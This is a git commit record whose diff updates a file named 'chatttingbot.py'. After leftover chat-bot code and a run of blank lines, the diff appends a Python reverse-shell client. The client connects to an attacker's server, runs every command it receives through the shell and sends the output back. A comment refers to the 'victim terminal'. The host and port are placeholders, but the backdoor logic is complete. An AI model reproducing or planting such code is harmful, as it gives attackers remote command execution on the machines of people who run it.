5b3dd65d812f655cd5c9e5eb4d7253e0600810b4
Kal0wn <86701829+Kalown@users.noreply.github.com>
2022-02-05 22:10:52 +0530

    Update chatttingbot.py

--- chatttingbot.py
+++ chatttingbot.py
@@ -90,3 +90,33 @@ z = int(input("Enter the password"))
 if zero == (2016 - z):
     print("The name of the subject is", )
 """
+
+
+
+
+
+
+
+############## [+] Client Flie [+] #################
+
+
+import socket
+import os
+import subprocess
+
+s = socket.socket()
+host = 'Server IP'
+port = 'give a port same as attacker'
+s.connect((host, port))
+
+while True:
+    data = s.recv(1024)
+    if data[:2].decode("utf-8") == 'cd':
+        os.chdir(data[3:].decode("utf-8"))
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        output_byte = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_byte, "utf-8")
+        currentWD = os.getcwd() + ">"
+        s.send(str.encode(output_str + currentWD))
+        #print(output_str) #comment this string if u dont want output on the victim terminal
